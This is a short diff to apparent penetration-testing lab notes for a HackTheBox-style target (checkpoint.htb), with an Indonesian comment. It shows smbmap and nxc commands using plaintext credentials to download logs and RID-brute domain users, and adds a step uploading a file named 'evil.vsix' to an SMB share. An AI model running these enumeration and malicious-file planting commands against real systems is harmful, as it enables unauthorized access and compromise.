@@ -45,3 +45,8 @@ smbmap -H 10.129.245.130 -u wallace.everette -p Welcome2026@ --download './Logs/
 # jika nama ada akhiran $, berarti itu adalah computer account  
 nxc smb 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' --rid-brute | tee listuser.txt
 ```
+
+# Upload
+```shell
+smbclient //10.129.28.66/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "put evil.vsix evil.vsix"
+```
